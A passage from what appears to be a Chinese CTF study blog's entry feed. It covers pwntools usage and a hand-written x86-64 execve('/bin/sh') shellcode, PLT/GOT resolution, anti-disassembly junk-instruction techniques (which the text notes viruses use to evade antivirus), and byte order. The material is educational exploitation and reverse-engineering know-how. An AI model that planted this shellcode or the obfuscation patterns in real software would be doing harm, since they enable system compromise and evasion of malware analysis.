class="language-python">io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'But there is gift for you :\n'</span><span class="token punctuation">)</span>   <span class="token comment"># 屏幕输出信息</span>main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>caiji<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>   <span class="token comment"># 接收直到 \n 为止的输出数据，并将其转换为16进制 int 型，最后赋值main_addr</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><strong>若地址随机，即：每次输出到屏幕的信息不一样，则不能采取直接赋值，只能使用此方法</strong></li></ul><hr><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><ul><li><p>当我们在获得程序的漏洞后，就可以在程序的漏洞处执行特定的代码，而这些能够获取到 shell 的 code 就是 shellcode</p></li><li><p>在漏洞利用过程时，我们将精心编制好的 shellcode 通过有问题的程序写入到内存中，然后执行</p></li><li><p>该 shellcode 对应的C语言代码一般为：<code>system(&quot;/bin/sh&quot;)</code></p></li></ul><hr><h3 id="Pwntools-生成默认-shellcode"><a href="#Pwntools-生成默认-shellcode" class="headerlink" title="Pwntools 生成默认 shellcode"></a>Pwntools 生成默认 shellcode</h3><p>方法一：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 构造shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>方法二：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>linux<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 构造shellcode</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>这段代码有一个缺点，就是生成的 shellcode 比较长，在某些空间比较小的情况不能很好的使用</strong></li></ul><h3 id="手动编写-shellcode"><a href="#手动编写-shellcode" class="headerlink" title="手动编写 shellcode"></a>手动编写 shellcode</h3><ul><li><h4 id="shellcode-这一段代码调动-shell-的原理："><a href="#shellcode-这一段代码调动-shell-的原理：" class="headerlink" title="shellcode 这一段代码调动 shell 的原理："></a>shellcode 这一段代码调动 shell 的原理：</h4><ol><li>linux 中，存在着一系列的系统调用，这些系统调用都通过 <code>syscall</code> 指令来触发，并且通过 rax 寄存器作为系统调用号来区分不同的系统调用，可以通过查看 linux 源码目录下的 <code>arch/x86/entry/syscall_64.tbl</code> 获得对应的系统调用号。比如，<code>execve</code>（执行程序函数，类似于 Python 中的<code>os.system</code> 函数，可以调用其他程序的执行）对应的的系统调用号为 59</li><li>接着，通过 rdi 和 rsi 两个寄存器传入参数。其中，rdi 是指向运行程序的路径的指针，rsi 为一个指向 0 的指针，rdx 为 0</li></ol></li></ul><p>即，应该完成：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">rax <span class="token operator">=</span> <span class="token number">59</span>rdi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token char">'/bin/sh'</span><span class="token punctuation">]</span>rsi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>rdx <span class="token operator">=</span> <span class="token number">0</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应的汇编代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">xor rdx<span class="token punctuation">,</span>rdxpush rdxmov rsi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">0x68732f2f6e69622f</span>push raxmov rdi<span class="token punctuation">,</span>rspmov rax<span class="token punctuation">,</span><span class="token number">59</span>syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><h4 id="利用Pwntools编译使用："><a href="#利用Pwntools编译使用：" class="headerlink" title="利用Pwntools编译使用："></a>利用Pwntools编译使用：</h4></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>shellcode <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdx,rdx;push rdx;mov rsi,rsp;mov rax,0x68732f2f6e69622f;push rax;mov rdi,rsp;mov rax,59;syscall;'''</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span> \# 这里因为<span class="token number">64</span>位数据不能直接push，所以用了rax寄存器来传递<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><strong>这样生成的 shellcode 就只有30字节，一般这种大小就足够了</strong></li></ul><hr><h2 id="Pwntools语句"><a href="#Pwntools语句" class="headerlink" title="Pwntools语句"></a>Pwntools语句</h2><h3 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io &#x3D; porcess(“.&#x2F;&lt;文件名&gt;”)</td><td>本地连接</td></tr><tr><td>io &#x3D; remote(“ip地址”, 端口)</td><td>远程连接</td></tr><tr><td>io.close()</td><td>关闭连接</td></tr></tbody></table><hr><h3 id="发送-payload"><a href="#发送-payload" class="headerlink" title="发送 payload"></a>发送 payload</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.sendafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload</td></tr><tr><td>io.sendlineafter(some_string, payload)</td><td>接收到 some_string 后，发送你的 payload，并进行换行（末尾\n）</td></tr><tr><td>io.send(payload)</td><td>发送 payload</td></tr><tr><td>io.sendline(payload)</td><td>发送 payload，并进行换行（末尾\n）</td></tr></tbody></table><hr><h3 id="接收返回内容"><a href="#接收返回内容" class="headerlink" title="接收返回内容"></a>接收返回内容</h3><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.interactive()</td><td>直接进行交互，相当于回到 shell 的模式，一般在取得 shell 之后使用</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>asm(shellcraft.sh())</td><td>生成 Pwntools 默认 shellcode</td></tr><tr><td>shellcode &#x3D; asm(shellcode)</td><td>生成自己编写的 shellcode</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>io.recv(N)</td><td>接收 N 个字符</td></tr><tr><td>io.recvline()</td><td>接收一行输出</td></tr><tr><td>io.recvlines(N)</td><td>接收 N 个行输出</td></tr><tr><td>io.recvuntil(some_string)</td><td>接收到 some_string 为止</td></tr></tbody></table><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>stack&#x3D;int(io.recv(10),16)</td><td>接收回显的参数在栈上的地址，长度是10，以16进制表示</td></tr></tbody></table><hr><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p><strong>首先需要 <code>elf = ELF(&quot;./&lt;文件名&gt;&quot;)</code> 来产生一个对象</strong></p><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>elf.symbols[“a_function”]</td><td>找到 a_function 的地址</td></tr><tr><td>elf.got[“a_function”]</td><td>找到 a_function 的 got</td></tr><tr><td>elf.plt[“a_function”]</td><td>找到 a_function 的 plt</td></tr><tr><td>next(elf.search(“some_characters”))</td><td>找到包含 some_characters 的内容，可以是字符串、汇编代码或某个数值的地址</td></tr></tbody></table><hr><h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p><strong>首先需要 <code>rop = ROP(&quot;./&lt;文件名&gt;&quot;)</code> 创建一个对象</strong></p><table><thead><tr><th>语句</th><th>意义</th></tr></thead><tbody><tr><td>rop.raw(‘a’ * 32)</td><td>在构造的 rop 链里面写32个 a</td></tr><tr><td>rop.call(‘read’ , (0 , elf.bss(0x80)))</td><td>调用一个函数，可以简写成：<code>rop.read(0,elf.bss(0x80))</code></td></tr><tr><td>rop.chain()</td><td>就是整个 rop 链，发送的 payload</td></tr><tr><td>rop.dump()</td><td>直观地展示当前的 rop 链</td></tr><tr><td>rop.migrate(base_stage)</td><td>将程序流程转移到 base_stage（地址）</td></tr><tr><td>rop.unresolve(value)</td><td>给出一个地址，反解析出符号</td></tr><tr><td>rop.search(regs&#x3D;[‘ecx’ , ‘ebx’])</td><td>搜索对 eax 进行操作的 gadgets</td></tr><tr><td>rop.find_gadget([‘pop eax’ , ‘ret’])</td><td>搜索 <code>pop eax ret</code> 这样的 gadgets</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PLT表和GOT表</title>
      <link href="/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/"/>
      <url>/2023/03/19/CTF%20-%20Pwn/PLT%E8%A1%A8%E5%92%8CGOT%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="PLT表和GOT表"><a href="#PLT表和GOT表" class="headerlink" title="PLT表和GOT表"></a>PLT表和GOT表</h2><blockquote><p>为了更好的用户体验和内存、CPU的利用率，程序编译时会采用两种表进行辅助，一个为 PLT表，一个为 GOT表</p></blockquote><hr><h3 id="PLT表-称为-内部函数表，GOT表-称为-全局函数表-动态函数表"><a href="#PLT表-称为-内部函数表，GOT表-称为-全局函数表-动态函数表" class="headerlink" title="PLT表 称为 内部函数表，GOT表 称为 全局函数表(动态函数表)"></a>PLT表 称为 <mark>内部函数表</mark>，GOT表 称为 <mark>全局函数表</mark>(动态函数表)</h3><ul><li>这两个表是相对应的，PLT表中的数据就是 GOT表中的一个地址，可以理解为一定是一一对应的：<br><img src="https://s2.loli.net/2023/03/17/8sbdGo4LcXJAh7r.png" alt="CTF - Pwn_PLT表 &amp; GOT表1.png"></li></ul><hr><h3 id="PLT表其实是一个过渡的作用，PLT表中只存放-GOT表项的地址，而不是函数真实的地址，函数真实的地址存放在GOT表中"><a href="#PLT表其实是一个过渡的作用，PLT表中只存放-GOT表项的地址，而不是函数真实的地址，函数真实的地址存放在GOT表中" class="headerlink" title="PLT表其实是一个过渡的作用，PLT表中只存放 GOT表项的地址，而不是函数真实的地址，函数真实的地址存放在GOT表中"></a>PLT表其实是一个过渡的作用，PLT表中只存放 GOT表项的地址，而不是函数真实的地址，函数真实的地址存放在GOT表中</h3><ul><li><strong>当 <code>main()</code> 函数开始，会请求 PLT表 中这个函数对应的 GOT表 地址，若是第一次调用：</strong><br>1. 由函数调用跳入到 PLT表 中<br>2. PLT表 跳到 GOT表 中<br>3. 由 GOT表 回跳到 PLT表 中，这时候进行压栈，把代表函数的 ID 压栈<br>4. 接着跳转到公共的 PLT表 项中<br>5. 进入到 GOT表<br>6. 然后 <code>_dl_runtime_resolve</code> 对动态函数进行地址解析和重定位<br>7. 把动态函数真实的地址写入到GOT表项中，然后执行函数并返回</li><li><strong>若是第二次调用</strong><br>1. 由函数调用跳入到 PLT表 中<br>2. PLT表 跳入到 GOT表 中，由于这个时候该表项已经是动态函数的真实地址了，所以可以直接执行然后返回，例如：call scanf —&gt; scanf的 plt表 —&gt;scanf的 got表<br><img src="https://s2.loli.net/2023/03/17/SXbfnRoJVKGpej2.png" alt="CTF - Pwn_PLT表 &amp; GOT表2.png"><br>4. 当进入带有 @plt 标志的函数时，由函数调用跳入到PLT表中<br>5. 在 PLT表中找到对应的函数的 GOT表项地<br>6. 通过 jmp 指令跳转到 GOT表，得到函数的真实地址<br>7. 跳转到真实函数地址执行</li></ul><hr><ul><li>例如，在汇编代码中<br><img src="https://s2.loli.net/2023/03/17/BpfS9JQukl6qrzd.png" alt="CTF - Pwn_PLT表 &amp; GOT表3.png"></li><li><code>call _printf</code> 并不是跳转到了实际的 <code>_printf</code> 函数的位置。 因为在编译时程序并不能确定 <code>printf</code> 函数的地址， 所以这个 <code>call</code> 指令实际上是通过相对跳转， 跳转到了 PLT表 中的 <code>_printf</code> 项，然后再根据 PLT表 中的地址跳转到 GOT表，才能获取到实际的 <code>_printf</code> 函数地址，进而执行 <code>printf</code> 函数</li></ul><table><thead><tr><th align="left">段名</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">.got</td><td align="left">GOT（Global Offset Table）全局偏移表。这是「链接器」为「外部符号」填充的实际偏移表</td></tr><tr><td align="left">.plt</td><td align="left">PLT（Procedure Linkage Table）程序链接表。它有两个功能，要么在 <code>.got.plt</code> 节中拿到地址，并跳转。要么当 <code>.got.plt</code> 没有所需地址的时，触发「链接器」去找到所需地址</td></tr><tr><td align="left">.got.plt</td><td align="left">这个是 GOT 专门为 PLT 专门准备的节。说白了，**.got.plt 中的值是 GOT 的一部分**。它包含上述 PLT 表所需地址（已经找到的和需要去触发的）</td></tr><tr><td align="left">.plt.got</td><td align="left"></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 二进制漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将函数加密为数组动态执行</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/%E5%B0%86%E5%87%BD%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%BA%E6%95%B0%E7%BB%84%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/%E5%B0%86%E5%87%BD%E6%95%B0%E5%8A%A0%E5%AF%86%E4%B8%BA%E6%95%B0%E7%BB%84%E5%8A%A8%E6%80%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="花指令（代码与数据混合）"><a href="#花指令（代码与数据混合）" class="headerlink" title="花指令（代码与数据混合）"></a>花指令（代码与数据混合）</h2><blockquote><p>花指令实质就是一串垃圾指令，它与程序本身的功能无关，并不影响程序本身的逻辑</p><p>在软件保护中，花指令被作为一种手段来增加静态分析的难度，花指令也可以被用在病毒或木马上，通过加入花指令改变程序的特征码，躲避杀软的扫描，从而达到免杀的目的</p></blockquote><blockquote><p><em><strong>花指令是对抗反汇编的有效手段之一。目的是干扰 IDA 和 OD 等软件对程序的静态分析，使这些软件无法正常反汇编出原始代码</strong></em></p><p><strong>花指令分为两类：可执行的花指令、不可执行的花指令</strong></p></blockquote><hr><h3 id="常用的两类反汇编算法"><a href="#常用的两类反汇编算法" class="headerlink" title="常用的两类反汇编算法"></a>常用的两类反汇编算法</h3><ol><li><p><mark>线性扫描算法</mark> —— <em>逐行反汇编（无法将数据和内容进行区分）</em></p><ul><li><u>将遇到的每一条指令都解析成汇编指令</u>。没有对反汇编的内容进行判断，因而无法正确区分代码和数据，一些数据也会被当成代码来解码，从而导致反汇编出现错误，这种错误将会影响对下一条指令的正确识别</li><li>例如：简单的花指令 <code>0xE8</code> 是跳转指令，可以对线性扫描算法进行干扰，但是递归扫描算法可以正常分析<br><img src="https://s2.loli.net/2023/03/17/PK2fIRkFxwsCUJS.png" alt="CTF - Reverse_花指令1.png"></li></ul></li><li><p><mark>递归行进算法</mark> —— <em>按照代码可能的执行顺序进行反汇编程序</em></p><ul><li><u>按照代码可能的执行顺序来反汇编程序</u>。对每条可能的路径进行扫描，当解码出分支指令后，反汇编工具就将这个分支指令的地址记录下来，并分别反汇编各个分支中的指令，这种算法比较灵活，可以避免将代码中的数据作为指令来解码</li><li>例如：两个跳转一个指向无效数据，一个指向正常数据来干扰递归扫描算法<br><img src="https://s2.loli.net/2023/03/17/Eq8kMvyJNIX7H5e.png" alt="CTF - Reverse_花指令2.png"></li></ul></li></ol><hr><h3 id="一般的花指令"><a href="#一般的花指令" class="headerlink" title="一般的花指令"></a>一般的花指令</h3><p><img src="https://s2.loli.net/2023/03/17/hKwl3Sd5Mmv6ojt.png" alt="CTF - Reverse_花指令3.png"></p><hr><h3 id="可执行的花指令"><a href="#可执行的花指令" class="headerlink" title="可执行的花指令"></a>可执行的花指令</h3><blockquote><p>能够正常运行但又不改变原始程序逻辑性的一组无用指令，它们运行完后不会改变原来程序的堆栈、寄存器，但能起到干扰静态分析的作用</p><p>这类花指令有如下特点：</p><ol><li>可以正常运行</li><li>不改变任何寄存器的值</li><li>反汇编器可以正确反汇编该指令</li></ol><p>一般分两种：</p><ol><li>改变堆栈操作</li><li>利用 <strong>call 指令</strong>或 <strong>jmp 指令</strong>增加执行流程的复杂度【call 指令的硬指令为 0E8h，<mark>E8 表示执行，90 表示跳过</mark>】</li></ol></blockquote><ul><li><strong>示例：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>push eax<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 32位 下，<code>push eax</code> 分为两个步骤：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">4</span>     <span class="token comment">// 修改堆栈指针 ESP (压入时自动减 4)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>eax<span class="token punctuation">)</span>     <span class="token comment">// 将指定的操作数送入新的栈顶位置</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>正常情况下，push 操作需要对应一个 pop 操作来保持堆栈的平衡</strong><br>在 32位 下，<code>pop eax</code> 分为两个步骤：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">(</span>eax<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment">// 将栈顶位置送入指定的操作数</span><span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">&lt;</span><span class="token operator">--</span> <span class="token punctuation">(</span>esp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span>     <span class="token comment">// 修改堆栈指针 ESP (退出时自动加 4)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>后面跟着的 <code>add esp, 4</code> 起到了 pop 指令的部分功能，也就是恢复了堆栈的平衡，使得程序能够正常运行<br>但在 IDA 中却无法正常识别这种操作，所以 IDA 进行解析时会认为该函数堆栈不平衡，从而使F5功能失效</strong><br><img src="https://s2.loli.net/2023/03/17/p2tLg6oSuRHNDPc.png" alt="CTF - Reverse_花指令4.png"></p><hr><h3 id="不可执行的花指令"><a href="#不可执行的花指令" class="headerlink" title="不可执行的花指令"></a>不可执行的花指令</h3><blockquote><p>花指令虽然被插入到了正常代码的中间，但是并不意味着它一定会得到执行。</p><p>这类不可执行的花指令通常形式为：<mark>在代码中出现了类似数据的代码，或者 IDA 反汇编后为 JUMPOUT(xxxxx)</mark></p><p>这类花指令一般不属于 CPU 可识别的操作码，那么就需要在上面用跳转跳过这些花指令才能保证程序的正常运行</p></blockquote><ul><li><strong>示例 1：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>xor eax<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>jz s<span class="token punctuation">;</span>_emit <span class="token number">0x11</span><span class="token punctuation">;</span>   <span class="token comment">// _emit 指令为：插入字节码</span>_emit <span class="token number">0x22</span><span class="token punctuation">;</span>_emit <span class="token number">0x33</span><span class="token punctuation">;</span>   <span class="token comment">// 0x33是 xor 指令的操作码，会导致后面正常的 Push 指令被错误解析</span>s<span class="token operator">:</span><span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于经过 <code>xor eax, eax</code> 后，ZF 标志位被置为 1，那么 jz 这条跳转指令必定会被执行，后面插入的 <code>0x11</code>，<code>0x22</code>，<code>0x33</code> 就会被跳过，程序正常输出： <code>Hello World!</code><br>但是在 IDA 中，IDA 已经无法正确解析这段代码：<br><img src="https://s2.loli.net/2023/03/18/s96JnKrg1o5tlYW.png" alt="NSSCTF-jump_by_jump2.png"></p><ul><li><strong>示例 2：</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>_asm <span class="token punctuation">&#123;</span>xor eax<span class="token punctuation">,</span> eax<span class="token punctuation">;</span>jz s<span class="token punctuation">;</span>add esp<span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token punctuation">&#125;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>插入的花指令也可以是改变堆栈平衡的汇编代码，虽然这里的花指令不会被执行，但是 IDA 进行解析时会认为该函数堆栈不平衡，从而使 F5 功能失效</p><hr><h3 id="花指令的实现"><a href="#花指令的实现" class="headerlink" title="花指令的实现"></a>花指令的实现</h3><ol><li><strong>简单jmp</strong><br>这是最简单的花指令。OD 能被骗过去，但是因为 IDA 采用的是递归扫描法，所以能够正常识别</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>jmp label1db junkcodelabel1<span class="token operator">:</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><strong>多层跳转</strong><br>本质上和简单跳转是一样的，只是加了几层跳转。无法干扰 IDA</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">start<span class="token operator">:</span>   <span class="token comment">//花指令开始</span>    jmp label1    DB junkcodelabel1<span class="token operator">:</span>     jmp label2     DB junkcodelabel2：    jmp label3    DB junkcodelabel3   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li><strong>jnx 和 jx 条件跳转</strong><br>利用 jz 和 jnz 的互补条件跳转指令来代替 jmp。无法干扰吾爱破解版 OllyDBG，但 IDA 不能正常识别</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">_asm<span class="token punctuation">&#123;</span>    jz label1    jnz label1    db junkcodelabel1<span class="token operator">:</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li><strong>永真条件跳转</strong><br>通过设置永真或永假的条件，导致程序一定会执行。也可以调用某些会返回确定值的函数，来达到构造永真或永假条件。这种方式 IDA 和 OD 都无法正常识别</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>    push ebx    xor ebx<span class="token punctuation">,</span>ebx    test ebx<span class="token punctuation">,</span>ebx    jnz label1    jz label2label1<span class="token operator">:</span>    _emit junkcodelabel2<span class="token operator">:</span>   pop ebx   <span class="token comment">//需要恢复ebx寄存器    </span><span class="token punctuation">&#125;</span>__asm<span class="token punctuation">&#123;</span>clcjnz label1<span class="token operator">:</span>_emit junkcodelabel1<span class="token operator">:</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li><strong>call &amp; ret 构造花指令</strong><br>利用 call 和 ret，在函数中修改返回地址，达到跳过 thunkcode 到正常流程的目的。可以干扰 IDA 的正常识别</li></ol><blockquote><p>call指令：将下一条指令地址压入栈，再跳转执行<br>ret指令：将保存的地址取出，跳转执行</p></blockquote><pre class="line-numbers language-c" data-language="c"><code class="language-c">__asm<span class="token punctuation">&#123;</span>    call label1    _emit junkcodelabel1<span class="token operator">:</span>    add dword ptr ss<span class="token operator">:</span><span class="token punctuation">[</span>esp<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">8</span>   <span class="token comment">//具体增加多少根据调试来</span>    ret    _emit junkcode<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li><strong>汇编指令共用 opcode</strong><br>jmp 的条指令是 <code>inc eax</code> 的第一个字节，<code>inc eax</code> 和 <code>dec eax</code> 抵消影响。这种共用 opcode 的方法比较麻烦<br><img src="https://s2.loli.net/2023/03/17/FMXUuecd8JoTAV7.png" alt="CTF - Reverse_花指令5.png"><br><img src="https://s2.loli.net/2023/03/17/sNhcongQPjmZKHG.png" alt="CTF - Reverse_花指令6.png"></li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> REVERSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大端序和小端序</title>
      <link href="/2023/03/19/CTF%20-%20Reverse/%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F/"/>
      <url>/2023/03/19/CTF%20-%20Reverse/%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="字节存储顺序"><a href="#字节存储顺序" class="headerlink" title="字节存储顺序"></a>字节存储顺序</h2><h3 id="主要分为-大端序（Big-endian）和小端序（Little-endian），区别如下："><a href="#主要分为-大端序（Big-endian）和小端序（Little-endian），区别如下：" class="headerlink" title="主要分为 大端序（Big-endian）和小端序（Little-endian），区别如下："></a>主要分为 大端序（Big-endian）和小端序（Little-endian），区别如下：</h3><blockquote><p><mark>大端序</mark>：高位字节 -&gt; 低地址，低位字节 -&gt; 高地址<br><mark>小端序</mark>：低位字节 -&gt; 低地址，高位字节 -&gt; 高地址</p></blockquote><hr><h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><blockquote><p>若为常见的大小类型（如 int）， 则是顺序（高位在左）<br>若为其他的大小类型（如 int64），则是逆序（高位在右）</p></blockquote><p><img src="https://s2.loli.net/2023/03/17/279vjKFm3txQDk6.png" alt="CTF - Reverse_大端序和小端序1.png"></p><blockquote><p><em><strong>不管是大端法还是小端法存储，计算机在内存中存放数据的顺序都是从低地址到高地址</strong></em><br><em><strong>不同的是，取低字节的数据存放在低地址，还是取高字节数据存放在低地址</strong></em></p></blockquote><ul><li>例如，将 12345678h 写入 1000h 开始的内存中，以大端序和小端序模式存放结果如下：<br><img src="https://s2.loli.net/2023/03/17/Pm2r6WLoHw5vuDc.png" alt="CTF - Reverse_大端序和小端序2.png"></li></ul><ol><li>在小端顺序里， v1 &#x3D; 0x12345678 在内存的字节码中看起来是这样 78h 56h 34h 12h，这没有问题<br>如果这时有 v2 &#x3D; 0x1234，在内存的字节码中看起来是 34h 12h</li><li>假如 v2 后面紧接着 v1 的话，字节码应该就是 34h 12h 78h 56h 34h 12h<br>再放一个 v3 &#x3D; 0x12 的话，总的排序就是 12h 34h 12h 78h 56h 34h 12h</li></ol><blockquote><p>一般来说，x86 系列 CPU 都是 Little-endian 字节序，PowerPC 通常是 Big-endian 字节序<br>但是对于 [1, 2, 3, 4] 这么一个数组，并不会受到字节序的影响。它的排序无论大端序还是小端序都是一样的</p></blockquote><hr><h3 id="在-IDA-中，F5-查看伪代码后，如果看到："><a 